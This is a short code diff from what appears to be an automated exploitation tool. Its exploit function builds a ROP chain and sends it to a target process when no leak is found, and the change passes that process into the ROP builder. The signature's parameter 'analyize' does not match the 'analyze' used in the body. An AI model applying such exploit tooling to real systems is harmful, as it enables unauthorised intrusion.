@@ -53,7 +53,7 @@ def exploit(analyize, v_lvl):
     
     fart_print.info("Determining vulnerability type")
     if not analyze.has_leak():
-        rop = Fart_ROP.ROP(analyze, v_lvl)
+        rop = Fart_ROP.ROP(analyze, v_lvl, p)
         try:
             send(rop.build_exploit(), p, analyze)
         except EOFError:
